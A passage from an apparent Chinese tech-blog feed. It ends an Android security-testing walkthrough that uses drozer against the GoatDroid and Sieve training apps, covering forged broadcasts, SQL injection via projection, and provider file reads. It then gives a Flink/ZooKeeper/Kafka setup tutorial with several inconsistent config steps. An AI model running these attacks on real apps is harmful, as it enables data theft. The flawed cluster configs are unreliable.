<li>查看反编译出(<code>apktool d goatdroid.apk</code>)的<code>AndroidManifest.xml</code>文件，可看到将<code>receiver</code>的<code>exported</code>设置未进行设置(由于存在了filter，默认属性为true)。说明存在越权问题，可发送恶意广播，伪造消息等等。</li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220407111007905.png" alt="image-20220407111007905"></p>
<blockquote>
<p>当前broadcast Receiver 是否可以从当前应用外部获取Receiver message true，可以；false 不可以。如果为false ,当前broadcast Receiver 只能收到同一个应用或者拥有同一 user ID 应用发出广播。</p>
<p>默认值根据当前 broadcast Receiver 是否包含intent filter来定。如果没有任何的filter的话意味着只有在被详细的描述了class name的情况下才会被唤起。这意味着当前Receiver只能在应用内部被使用（因为其它应用不知道这个类的存在。）在这种情况下，默认值是false。如果至少包含一个filter意味着当前broadcast Receiver 将会收到来自系统或者其它应用的广播，所以这个时候默认值是true。</p>
<p>不只有这个属性可以指定broadcast Receiver 是否暴露给其它应用。你也可以使用permission来限制外部应用给他发送消息</p>
<p>更多的<a href="https://blog.csdn.net/watermusicyes/article/details/46460347">参考资料</a></p>
</blockquote>
<ul>
<li>反编译查看源代码，发现需要两个参数<code>phoneNumber</code>和<code>message</code>。</li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220408194905671.png" alt="image-20220408194905671"></p>
<h4 id="漏洞利用-可发送恶意广播包"><a href="#漏洞利用-可发送恶意广播包" class="headerlink" title="漏洞利用-可发送恶意广播包"></a>漏洞利用-可发送恶意广播包</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message pwnd!</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408195320526.png" alt="image-20220408195320526"></p>
<h4 id="漏洞利用，拒绝服务攻击检测"><a href="#漏洞利用，拒绝服务攻击检测" class="headerlink" title="漏洞利用，拒绝服务攻击检测"></a>漏洞利用，拒绝服务攻击检测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408195645407.png" alt="image-20220408195645407"></p>
<h3 id="Services组件"><a href="#Services组件" class="headerlink" title="Services组件"></a>Services组件</h3><blockquote>
<p>一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。</p>
</blockquote>
<blockquote>
<p>然而，音乐重放这个功能并没有对应的activity，因为使用者当然会认为在导航到其它屏幕时音乐应该还在播放的。在这个例子中，媒体播放器这个activity 会使用Context.startService()来启动一个service，从而可以在后台保持音乐的播放。同时，系统也将保持这个service 一直执行，直到这个service 运行结束。</p>
</blockquote>
<blockquote>
<p>另外，我们还可以通过使用Context.bindService()方法，连接到一个service 上（如果这个service 还没有运行将启动它）。当连接到一个service 之后，我们还可以service 提供的接口与它进行通讯。拿媒体播放器这个例子来说，我们还可以进行暂停、重播等操作。 intent-filter未将exported设置为false，默认是可以导出的。</p>
</blockquote>
<p><img src="/aposts/2b1c1b8c/image-20220408195931828.png" alt="image-20220408195931828"></p>
<ul>
<li><code>org.owasp.fourgoats.goatdroid.LocationService</code>服务被导出，不需要任何权限。所以这意味着任何与<code>FourGoats</code>应用程序安装在设备上的恶意应用程序可以访问设备的位置。</li>
</ul>
<h4 id="让我们尝试启动特定服务"><a href="#让我们尝试启动特定服务" class="headerlink" title="让我们尝试启动特定服务"></a>让我们尝试启动特定服务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408200049130.png" alt="image-20220408200049130"></p>
<ul>
<li>查看services信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.service.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408200401332.png" alt="image-20220408200401332"></p>
<ul>
<li>启动相关服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure>

<ul>
<li>观察状态栏中的位置标志和GPS位置正在由FourGoats应用程序访问，<strong>这里我出现应用已停止的提示，贴人家攻击成功的图片</strong></li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220408201610560.png" alt="image-20220408201610560"></p>
<h3 id="Content组件"><a href="#Content组件" class="headerlink" title="Content组件"></a>Content组件</h3><blockquote>
<p>android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>
</blockquote>
<ul>
<li>查看<code>fourgoats</code>该APP的可攻击点，可以看到存在<code>broadcast</code>广播问题。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408202246019.png" alt="image-20220408202246019"></p>
<h4 id="信息泄露利用"><a href="#信息泄露利用" class="headerlink" title="信息泄露利用"></a>信息泄露利用</h4><ul>
<li>扫描并获取Content Provider信息，并列出了可访问内容URI的列表和路径：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line"></span><br><span class="line">Accessible content URIs:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>

<ul>
<li>查询或修改数据库中的数据，发现存在数据泄露问题，访问uri可看到一些敏感信息，</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">| _id | service | username | password | email |</span><br></pre></td></tr></table></figure>

<p>我本人查到的是空数据，因为这个apk我还使用，因此没有任何数据，贴一个<strong>其他博客有数据的图片</strong></p>
<p><img src="/aposts/2b1c1b8c/image-20220408203718126.png" alt="image-20220408203718126"></p>
<h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>同样content可能导致注入问题。使用以下语句进行测试发现报错，说明存在SQL注入漏洞，直接注入了*号，查询到数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection  &quot;*&quot;</span><br><span class="line">| _id | service | username | password | email |</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>列出所有表信息</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408204237027.png" alt="image-20220408204237027"></p>
<ul>
<li><strong>同时也可以使用扫描功能对该app注入点位置进行扫描</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run scanner.provider.injection -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408204354777.png" alt="image-20220408204354777"></p>
<ul>
<li><strong>列出该app的表信息</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408204508903.png" alt="image-20220408204508903"></p>
<h4 id="底层文件操作"><a href="#底层文件操作" class="headerlink" title="底层文件操作"></a>底层文件操作</h4><ul>
<li>文件读取</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts </span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408204701317.png" alt="image-20220408204701317"></p>
<ul>
<li>文件下载</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data</span><br></pre></td></tr></table></figure>

<ul>
<li>文件下载没有执行成功，执行成功后应该回显以下内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/com.mwr.example.sieve/databases/database.db /home/user/database.db </span><br><span class="line">Written 24576 bytes</span><br></pre></td></tr></table></figure>

<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><ul>
<li>目录遍历漏洞</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220408204953757.png" alt="image-20220408204953757"></p>
<p>更多Drozer使用方法可参阅官方指南（英文）：**<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf"> Drozer 使用指南</a>**</p>
]]></content>
      <categories>
        <category>app安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>app安全测试</tag>
        <tag>android</tag>
        <tag>drozer</tag>
      </tags>
  </entry>
  <entry>
    <title>Flink+zk+python+kafka集群实时日志读取</title>
    <url>/aposts/d4ea272f/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本文章主要是学Flink 处理实时数据，使用zk+kafka搭建日志系统，python编写测试代码</li>
<li>本次服务器，采用的腾讯云服务器，使用的centos7 系统</li>
<li>本次的flink采用本地部署的方式，zk+kafka采用伪分布式</li>
</ul>
<h2 id="Flink特点"><a href="#Flink特点" class="headerlink" title="Flink特点"></a>Flink特点</h2><ul>
<li>采用了基于操作符（Operator）的连续流模型，可以做到微秒级别的延迟。Flink最核心的数据结构是Stream，它代表一个运行在多分区上的并行流。在大数据场景中，经常用来对实时要求比较高的操作，比如实时处理。</li>
</ul>
<h3 id="如何选择Spark和Flink"><a href="#如何选择Spark和Flink" class="headerlink" title="如何选择Spark和Flink"></a>如何选择Spark和Flink</h3><ul>
<li><p>对于以下场景，你可以选择 Spark：</p>
<ul>
<li>数据量非常大而且逻辑复杂的批数据处理，并且对计算效率有较高要求（比如用大数据分析来构建推荐系统进行个性化推荐、广告定点投放等）；</li>
<li>基于历史数据的交互式查询，要求响应较快；</li>
<li>基于实时数据流的数据处理，延迟性要求在在数百毫秒到数秒之间。</li>
</ul>
</li>
<li><p>Spark完美满足这些场景的需求，而且它可以一站式解决这些问题，无需用别的数据处理平台。由于Flink是为了提升流处理而创建的平台，所以它适用于各种需要非常低延迟（微秒到毫秒级）的实时数据处理场景，比如实时日志报表分析。<br>而且Flink 用流处理去模拟批处理的思想，比Spark 用批处理去模拟流处理的思想扩展性更好</p>
</li>
<li><p>具体<a href="https://blog.csdn.net/weixin_40247263/article/details/97000109">参考</a></p>
</li>
</ul>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><ul>
<li>flink安装的版本现在在官网为最新版本：V1.14.2，对java要求为8或者11</li>
<li>我之前已经搭建好了java刚好为 java8，此步省略</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# java -version</span><br><span class="line">java version &quot;1.8.0_311&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_311-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.311-b11, mixed mode)</span><br><span class="line">[root@VM-24-13-centos ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="flink"><a href="#flink" class="headerlink" title="flink"></a>flink</h3><ul>
<li>常见部署模式分为：local本地部署（学习研究环节），集群模式有Standalone Cluster、Flink ON YARN、Mesos，Docker，Kubernetes等</li>
<li><strong>本次采用本地部署</strong>，后续打算用本地三台虚拟机的方式学习（和hadoop一起）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://mirrors.aliyun.com/apache/flink/flink-1.14.2/flink-1.14.2-bin-scala_2.11.tgz</span><br><span class="line">tar -zxvf flink-1.14.2-bin-scala_2.11.tgz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置环境变量</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"></span><br><span class="line">export FLINK_HOME=/usr/local/flink-1.14.2</span><br><span class="line">export PATH=$PATH:$FLINK_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<ul>
<li>启动flink</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos flink-1.14.2]# ./bin/start-cluster.sh</span><br><span class="line">Starting cluster.</span><br><span class="line">Starting standalonesession daemon on host VM-24-13-centos.</span><br><span class="line">Starting taskexecutor daemon on host VM-24-13-centos.</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos flink-1.14.2]# ps -ef | grep flink</span><br><span class="line">root     22422     1  3 17:05 pts/1    00:00:06 /usr/local/jdk1.8.0_311/bin/java                         .../flink-root-standalonesession-0-VM-24-13-c</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>flink一般都是8081端口，需要服务器防火墙打开，然后再腾讯云服务器再单独开启相应端口</li>
</ul>
<p><img src="/aposts/d4ea272f/image-20220104172514390.png" alt="image-20220104172514390"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos flink-1.14.2]# firewall-cmd --zone=public --add-port=8081/tcp --permanent</span><br><span class="line">success</span><br><span class="line">[root@VM-24-13-centos flink-1.14.2]# firewall-cmd --reload</span><br><span class="line">success</span><br></pre></td></tr></table></figure>

<ul>
<li>远程可以访问</li>
</ul>
<p><img src="/aposts/d4ea272f/image-20220104172658930.png" alt="image-20220104172658930"></p>
<h3 id="kafka"><a href="#kafka" class="headerlink" title="kafka"></a>kafka</h3><ul>
<li>一个分布式的、可分区的、可复制的消息中间件系统。kafka依赖于zookeeper</li>
</ul>
<h4 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h4><ul>
<li>注册中心，主要功能就是对中间件进行<strong>分布式通知&#x2F;协调</strong>，比如对外部需要调用kafka，其实是通过调用zk进行协调访问。</li>
<li><strong>Master选举的方式是核心</strong>，可以看看<a href="https://blog.csdn.net/lingbo229/article/details/81052078">zookeeper的原理和应用（非常详细透彻）</a>和<a href="https://www.cnblogs.com/xinyonghu/p/11031729.html">ZooKeeper原理及介绍</a>，我暂时也没完全理解，zk有三个角色：<strong>leader(主)、follower（从）、observer（观察）</strong></li>
<li>安装kafka之前，先安装zk，zk有三种部署方式：本地、伪分布式、完全分布式。<strong>本次打算采用伪分布式</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.aliyun.com/apache/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">tar -zxvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line"></span><br><span class="line">mv apache-zookeeper-3.7.0-bin zookeeper_01</span><br></pre></td></tr></table></figure>

<ul>
<li>复制1份zoo.cfg 配置文件，命名为 zoo.cfg，并做好配置，<strong>注意填入的ip要填入腾讯云的内外ip，之前填入公网ip一直启动失败</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd zookeeper_01/conf</span><br><span class="line">cp zoo_sample.cfg zoo.cfg</span><br><span class="line">vi zoo.cfg</span><br><span class="line"></span><br><span class="line">dataDir=/usr/local/zookeeper_01/data</span><br><span class="line">clientPort=2181</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>复制zookeeper_01目录伪zookeeper_02，配置zoo.cfg</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">mv zookeeper_01 zookeeper_02</span><br><span class="line">cd zookeeper_02</span><br><span class="line">vi zoo.cfg</span><br><span class="line"></span><br><span class="line">dataDir=/usr/local/zookeeper_02/data</span><br><span class="line">clientPort=2182</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>复制zookeeper_01目录伪zookeeper_03，配置zoo.cfg</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">mv zookeeper_01 zookeeper_03</span><br><span class="line">cd zookeeper_03</span><br><span class="line">vi zoo.cfg</span><br><span class="line"></span><br><span class="line">dataDir=/usr/local/zookeeper_03/data</span><br><span class="line">clientPort=2183</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>修改zookeeper_01中conf目录下zoo.cfg文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dataDir=/usr/local/zookeeper_01/data</span><br><span class="line">clientPort=2181</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zookeeper_02中conf目录下zoo.cfg文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dataDir=/usr/local/zookeeper_02/data</span><br><span class="line">clientPort=2182</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zookeeper_03中conf目录下zoo.cfg文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dataDir=/usr/local/zookeeper_03/data</span><br><span class="line">clientPort=2183</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>分别启动zookeeper_01、zookeeper_02、zookeeper_03</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos zookeeper_01]# bin/zkServer.sh start</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_02/bin/zkServer.sh start</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_03/bin/zkServer.sh start</span><br></pre></td></tr></table></figure>

<ul>
<li>查看有三个<code>QuorumPeerMain</code>进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# jps</span><br><span class="line">4674 QuorumPeerMain</span><br><span class="line">2594 NodeManager</span><br><span class="line">2467 ResourceManager</span><br><span class="line">4774 QuorumPeerMain</span><br><span class="line">32550 CMDRunner.jar</span><br><span class="line">22422 StandaloneSessionClusterEntrypoint</span><br><span class="line">30150 SecondaryNameNode</span><br><span class="line">6087 Jps</span><br><span class="line">22698 TaskManagerRunner</span><br><span class="line">29930 DataNode</span><br><span class="line">4589 QuorumPeerMa</span><br></pre></td></tr></table></figure>

<ul>
<li>查看每个zk启动的模式，发现zookeeper_03的model为leader</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# bin/zkServer.sh status</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper_01/bin/../conf/zoo.cfg</span><br><span class="line">Client port found: 2181. Client address: localhost. Client SSL: false.</span><br><span class="line">Mode: follower</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_02/bin/zkServer.sh status</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper_02/bin/../conf/zoo.cfg</span><br><span class="line">Client port found: 2182. Client address: localhost. Client SSL: false.</span><br><span class="line">Mode: follower</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_03/bin/zkServer.sh status</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper_03/bin/../conf/zoo.cfg</span><br><span class="line">Client port found: 2183. Client address: localhost. Client SSL: false.</span><br><span class="line">Mode: leader</span><br></pre></td></tr></table></figure>

<h4 id="kafka介绍"><a href="#kafka介绍" class="headerlink" title="kafka介绍"></a>kafka介绍</h4><ul>
<li>kafka是Apache组织下的一个开源系统，它的最大的特性就是可以实时的处理大量数据以满足各种需求场景：比如基于hadoop平台的数据分析、低时延的实时系统、storm&#x2F;spark流式处理引擎等。kafka现在它已被多家大型公司作为多种类型的数据管道和消息系统使用。</li>
<li>来源于<a href="https://blog.csdn.net/okhymok/article/details/103506250">这里</a></li>
</ul>
<h4 id="kafka角色"><a href="#kafka角色" class="headerlink" title="kafka角色"></a>kafka角色</h4><table>
<thead>
<tr>
<th>角色</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Broker</td>
<td>Kafka服务器，无论是单台Kafka还是集群，被统一叫做Broker</td>
</tr>
<tr>
<td>Producer</td>
<td>指消息的生产者，负责发布消息到kafka broker</td>
</tr>
<tr>
<td>Consumer</td>
<td>指消息的消费者，从kafka broker拉取数据，并消费这些已发布的消息。Kafka发布消息通常有两种模式：**队列模式（queuing）和发布&#x2F;订阅模式(publish-subscribe)**。在队列模式下，只有一个消费组，而这个消费组有多个消费者，一条消息只能被这个消费组中的一个消费者所消费；而在发布&#x2F;订阅模式下，可有多个消费组，每个消费组只有一个消费者，同一条消息可被多个消费组消费</td>
</tr>
<tr>
<td>Topic</td>
<td>主题，用于建立生产者和消费者之间的订阅关系，生产者将消息发送到指定的Topic，然后消费者再从该Topic下去取消息</td>
</tr>
<tr>
<td>Partition</td>
<td>消息分区，一个Topic下面会有多个Partition，每个Partition都是一个有序队列，Partition中的每条消息都会被分配一个有序的id。</td>
</tr>
<tr>
<td>Consumer Group</td>
<td>消费者组，可以给每个Consumer指定消费组，若不指定消费者组，则属于默认的group</td>
</tr>
<tr>
<td>Message</td>
<td>消息，通信的基本单位，每个producer可以向一个topic发布一些消息。</td>
</tr>
</tbody></table>
<h4 id="kafka工作流程"><a href="#kafka工作流程" class="headerlink" title="kafka工作流程"></a>kafka工作流程</h4><ul>
<li><p>生产者定期向主题发送消息。</p>
</li>
<li><p>Kafka broker将所有消息存储在为该特定主题配置的分区中。它确保消息在分区之间平等共享。如果生产者发送两个消息，并且有两个分区，则Kafka将在第一个分区中存储一个消息，在第二个分区中存储第二个消息。</p>
</li>
<li><p>消费者订阅一个特定的主题。一旦消费者订阅了一个主题，Kafka将向消费者提供该主题的当前偏移量，并将偏移量保存在ZooKeeper中。</p>
</li>
<li><p>消费者将定期请求Kafka新消息。</p>
</li>
<li><p>一旦Kafka收到来自生产者的消息，它会将这些消息转发给消费者。消费者将收到消息并处理它。</p>
</li>
<li><p>一旦消息被处理，消费者将向Kafka broker发送确认。</p>
</li>
<li><p>一旦Kafka收到确认，它会将偏移量更改为新值，并在ZooKeeper中进行更新。由于ZooKeeper中保留了偏移量，因此即使在服务器出现故障时，消费者也可以正确读取下一条消息</p>
</li>
</ul>
<h4 id="kafka拓扑架构"><a href="#kafka拓扑架构" class="headerlink" title="kafka拓扑架构"></a>kafka拓扑架构</h4><ul>
<li>一个典型的Kafka集群包含若干Producer，若干broker、若干Consumer Group，以及一个Zookeeper集群。Kafka通过Zookeeper管理集群配置，选举leader，以及在Consumer Group发生变化时进行rebalance。Producer使用push模式将消息发布到broker，Consumer使用pull模式从broker订阅并消费消息。典型架构如下图所示</li>
</ul>
<p><img src="/aposts/d4ea272f/image-20220107101958730.png" alt="image-20220107101958730"></p>
<h4 id="安装配置kafka"><a href="#安装配置kafka" class="headerlink" title="安装配置kafka"></a>安装配置kafka</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://dlcdn.apache.org/kafka/3.0.0/kafka_2.12-3.0.0.tgz</span><br><span class="line">tar -zxvf kafka_2.12-3.0.0.tgz</span><br><span class="line">mv kafka_2.12-3.0.0 kafka</span><br><span class="line">cd kafka</span><br></pre></td></tr></table></figure>

<ul>
<li>复制server.properties命名为server1.properties，配置如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd kafka/config</span><br><span class="line">cp server.properties server1.properties</span><br><span class="line">vi server1.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器标识</span></span><br><span class="line">broker.id=1</span><br><span class="line">listeners=PLAINTEXT://10.0.24.13:9091</span><br><span class="line">log.dirs=/usr/kafka/kafka-logs1</span><br><span class="line">zookeeper.connect=10.0.24.13:2181,10.0.24.13:2182,10.0.24.13:2183</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>复制server1.properties命名为server2.properties，配置如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp server.properties1 server2.properties</span><br><span class="line">vi server1.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器标识</span></span><br><span class="line">broker.id=2</span><br><span class="line">listeners=PLAINTEXT://10.0.24.13:9092</span><br><span class="line">log.dirs=/usr/kafka/kafka-logs2</span><br><span class="line">zookeeper.connect=10.0.24.13:2182,10.0.24.13:2182,10.0.24.13:2182</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>复制server1.properties命名为server3.properties，配置如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp server.properties1 server3.properties</span><br><span class="line">vi server3.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器标识</span></span><br><span class="line">broker.id=3</span><br><span class="line">advertised.listeners=PLAINTEXT://10.0.24.13:9093</span><br><span class="line">log.dirs=/usr/kafka/kafka-logs3</span><br><span class="line">zookeeper.connect=10.0.24.13:2881,10.0.24.13:2882,10.0.24.13:2883</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建日志文件</span></span><br><span class="line">[root@VM-24-13-centos kafka]# mkdir kafka-logs1 kafka-logs2 kafka-logs3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>bin</code>目录下的<code>kafka-server-start.sh</code>文件，将初始堆的大小(-Xms)设置小一些，不然启动报错</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export KAFKA_HEAP_OPTS=&quot;-Xmx1024M -Xms128M&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动kafka。切记先要启动zk</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos local]# kafka/bin/kafka-server-start.sh kafka/config/server1.properties</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos local]# kafka/bin/kafka-server-start.sh kafka/config/server2.properties</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos local]# kafka/bin/kafka-server-start.sh kafka/config/server3.properties</span><br><span class="line">...</span><br><span class="line">2022-01-07 18:28:37,222] INFO [ExpirationReaper-3-topic]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,239] INFO [ExpirationReaper-3-Heartbeat]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,249] INFO [ExpirationReaper-3-Rebalance]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span 